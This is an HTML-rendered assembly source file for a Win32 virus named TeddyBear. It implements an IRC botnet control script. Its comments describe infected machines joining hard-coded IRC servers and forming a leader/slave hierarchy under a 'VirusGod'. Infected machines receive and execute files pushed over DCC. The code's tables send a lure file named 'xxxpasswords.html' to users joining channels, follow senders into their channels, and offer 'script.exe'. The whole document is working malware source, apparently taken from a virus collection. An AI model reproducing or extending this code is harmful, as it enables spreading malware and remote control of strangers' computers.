<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.TeddyBear - script.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; Main script, establich the contact between the new viruses.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; What happens when a new virus connects</span><span class="sc0">

</span><span class="sc1">; Step 1. On connect.</span><span class="sc0">
</span><span class="sc1">; SEND Nickname</span><span class="sc0">
</span><span class="sc1">; USER Ident . . :Realname</span><span class="sc0">

</span><span class="sc1">; Step 2. When connected</span><span class="sc0">
</span><span class="sc1">; Check if leader is online</span><span class="sc0">

</span><span class="sc1">; Step 3. If Leader is offline</span><span class="sc0">
</span><span class="sc1">; New leader is God</span><span class="sc0">
</span><span class="sc1">; Goto step 2</span><span class="sc0">

</span><span class="sc1">; Step 4. If leader is online</span><span class="sc0">
</span><span class="sc1">; Send "Hello master"</span><span class="sc0">

</span><span class="sc1">; Step 5. At Reply = "Hello child"</span><span class="sc0">
</span><span class="sc1">; Send "Do you have place for me?"</span><span class="sc0">

</span><span class="sc1">; Step 6. At Reply = "No, ask X"</span><span class="sc0">
</span><span class="sc1">; Change Leader to X</span><span class="sc0">
</span><span class="sc1">; Goto step 4</span><span class="sc0">

</span><span class="sc1">; Step 7. At Reply = "SEND: X"</span><span class="sc0">
</span><span class="sc1">; Check if file X exist</span><span class="sc0">
</span><span class="sc1">; If file doesnt exist, send "DCC X"</span><span class="sc0">

</span><span class="sc1">; Step 8. At Reply = 01,"DCC"</span><span class="sc0">
</span><span class="sc1">; Recieve the file and execute it</span><span class="sc0">



</span><span class="sc1">; What happens at the Leader side of the connection (the virus that is</span><span class="sc0">
</span><span class="sc1">; connected to the newly connected virus)</span><span class="sc0">

</span><span class="sc1">; Step 11. At Recieved = "Hello master"</span><span class="sc0">
</span><span class="sc1">; Send "Hello child"</span><span class="sc0">

</span><span class="sc1">; Step 12. At Recieved = "Do you have place for me?"</span><span class="sc0">
</span><span class="sc1">; Look how many slaves that it currently has</span><span class="sc0">

</span><span class="sc1">; Step 13. If Slave list if full (more then five slaves)</span><span class="sc0">
</span><span class="sc1">; Send "No, ask SlaveX"</span><span class="sc0">

</span><span class="sc1">; Step 14. If slave list isnt full</span><span class="sc0">
</span><span class="sc1">; Add new virus to slave list</span><span class="sc0">
</span><span class="sc1">; Send list of files</span><span class="sc0">

</span><span class="sc1">; Step 15. At Recieved = "DCC X"</span><span class="sc0">
</span><span class="sc1">; Open a DCC connection and send a CTCP DCC reply to virus</span><span class="sc0">

</span><span class="sc1">; This is the basics for a connection, if we want to upgrade the virus we</span><span class="sc0">
</span><span class="sc1">; just DCC it a file and it will download it and execute it. This virus will</span><span class="sc0">
</span><span class="sc1">; then send this program to every new virus at Step 14. These viruses will</span><span class="sc0">
</span><span class="sc1">; also send it further, so we get a whole branch that all has this program.</span><span class="sc0">

</span><span class="sc1">;                                               God</span><span class="sc0">
</span><span class="sc1">;                                          1 ( 2 3 4 5 )</span><span class="sc0">
</span><span class="sc1">; I DCC a new file to this virus -&gt;  1 ( 2 3 4 5 )</span><span class="sc0">
</span><span class="sc1">; All these will have the file   1 2 3 4 5</span><span class="sc0">
</span><span class="sc1">; too if they connected to IRC</span><span class="sc0">
</span><span class="sc1">; after i DCC'ed the new program</span><span class="sc0">


</span><span class="sc1">; The viruses regulary check to see if all slaves and its leader is online</span><span class="sc0">
</span><span class="sc1">; if the leader is gone it goes to step 3. If a slave is missing then it is</span><span class="sc0">
</span><span class="sc1">; deleted from the slave list.</span><span class="sc0">


</span><span class="sc1">; commands marked with three stars (***) are considered dangerous in the way</span><span class="sc0">
</span><span class="sc1">; that it would be easy for the AV's to find all viruses. Delete for less fun</span><span class="sc0">
</span><span class="sc1">; and more security</span><span class="sc0">

</span><span class="sc9">includelib</span><span class="sc0"> </span><span class="sc5">kernel32.lib</span><span class="sc0">
</span><span class="sc9">includelib</span><span class="sc0"> </span><span class="sc5">user32.lib</span><span class="sc0">


</span><span class="sc2">.486</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">stdcall</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">masm</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">windows.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">masm</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">kernel32.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc10">c</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">masm</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">user32.inc</span><span class="sc0">



        </span><span class="sc5">NULL</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">EndOfList</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc5">NoScan</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc5">ConnectFunction</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc5">DCCRecvFunction</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc5">DCCChatFunction</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc5">DCCSendFunction</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc5">QuitFunction</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc5">NewSlaveFunctions</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc5">ShouldRecieveProgram</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc5">GenerateNewNick</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0">

        </span><span class="sc5">ExecuteProgram</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc5">DirFunction</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">10</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">

   </span><span class="sc5">BeginOfScript</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc5">Header</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">Magic</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"VIRc"</span><span class="sc0">
        </span><span class="sc5">Alignment</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">401000h</span><span class="sc0">

        </span><span class="sc5">User</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Userinfo</span><span class="sc0">
        </span><span class="sc5">Slaves</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">SlaveNames</span><span class="sc0">
        </span><span class="sc5">Ignores</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">IgnoreNames</span><span class="sc0">
        </span><span class="sc5">IRCServers</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">IPList</span><span class="sc0">

        </span><span class="sc5">MessageParsePtr</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">MessageParseData</span><span class="sc0">

        </span><span class="sc5">DownloadedFiles</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">ListOfDownloadedFiles</span><span class="sc0">

   </span><span class="sc5">EndOfHeader</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------- User info</span><span class="sc0">

   </span><span class="sc5">Userinfo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">Nickname</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Vir00002"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc4">-(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Nickname</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">Ident</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Nick"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc4">-(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Ident</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">RealName</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"DrSolomon"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc4">-(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">RealName</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">God</span><span class="sc0">                     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"VirusGod"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc4">-(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">God</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">Leader</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"VirusGod"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc4">-(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Leader</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

   </span><span class="sc5">SlaveNames</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

   </span><span class="sc5">IgnoreNames</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

        


</span><span class="sc1">; ----------- List of IP addresses of undernet IRC servers</span><span class="sc0">

  </span><span class="sc5">IPList</span><span class="sc0">                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"192.160.127.97"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"130.243.35.1"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; efnet</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"203.37.45.2"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"209.47.75.34"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"195.154.203.241"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"194.159.80.19"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"128.138.129.31"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; -------------- How to handle messages</span><span class="sc0">

  </span><span class="sc5">MessageParseData</span><span class="sc4">:</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$0 "</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">RealStart</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

  </span><span class="sc5">RealStart</span><span class="sc4">:</span><span class="sc0">
                                

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 NICK"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$1:"</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">NickChangeProc</span><span class="sc0">
 
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 PRIVMSG"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$1 "</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc1">; split $1 at space until </span><span class="sc0">
                                                </span><span class="sc1">; two new strings is created</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">PrivMsgData</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 001"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; First message</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">StartCommands</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 303"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">IsOnMessage</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 JOIN"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$1:"</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">JoinMessage</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 319"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; WHOIS channels</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$1:"</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">JoinWhoisChannels</span><span class="sc0">

</span><span class="sc1">; Low level commands</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 433"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"f"</span><span class="sc0">
                                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">GenerateNewNick</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 PING"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">PingList</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$0 ERROR"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"f"</span><span class="sc0">
                                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">ConnectFunction</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">


</span><span class="sc5">JoinWhoisChannels</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 #"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">JoinChannel</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$4 #"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$4#"</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">SecondChannel</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">
</span><span class="sc5">SecondChannel</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"|$5 "</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">SecondChannel2</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">
                                
</span><span class="sc5">SecondChannel2</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"JOIN #$5"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">


</span><span class="sc5">PingList</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"PONG $1"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; check if all is online</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"ISON $slave1 $slave2 $slave3 $slave4 $slave5 $leader"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc5">NickChangeProc</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$nick $mynick"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"v"</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$mynick $2"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc5">JoinMessage</span><span class="sc4">:</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"!$nick $mynick"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0">
                                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">SendFileToJoiner</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc5">SendFileToJoiner</span><span class="sc4">:</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"v"</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$3 xxxpasswords.html"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"f"</span><span class="sc0">
                                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">DCCSendFunction</span><span class="sc0">

                                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

</span><span class="sc1">; ------------------------------------ Handler of PRIVMSGs</span><span class="sc0">

  </span><span class="sc5">PrivMsgData</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">NoScan</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"v"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$recv $1"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$1 $mynick"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; if where to send = mynick</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"v"</span><span class="sc0">                     </span><span class="sc1">; change that variable</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$recv $nick"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; to $nick. This happens</span><span class="sc0">
                                                </span><span class="sc1">; at private msgs</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$nick $leader"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; messages from the leader</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">LeaderMessages</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$slaves $nick"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">SlaveMessages</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$nick Bhunji"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">NickIsBhunji</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"!$nick $mynick"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; parse if ordinary user</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">UserMessages</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

  </span><span class="sc5">UserMessages</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"!$nick $leader"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                                </span><span class="sc1">; parse if ordinary user</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">UserMessages2</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

  </span><span class="sc5">UserMessages2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"!$nick $child"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                                                </span><span class="sc1">; parse if ordinary user</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">UserMessages3</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">EndOfList</span><span class="sc0">

                

  </span><span class="sc5">UserMessages3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :DCC script.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">SendScript</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :Hello master"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; Is message = Hello master</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"l"</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">NewVirusOnline</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"$2 :Do you have place for me?"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"f"</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewSlaveFunctions</span><span class="sc0">


                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"!$recv #"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; is a private message</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"s"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"WHOIS $recv"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; join all channels that</span><span class="sc0">
                                                </span><span class="sc1">; the sender is visiting</span><span class="sc0">

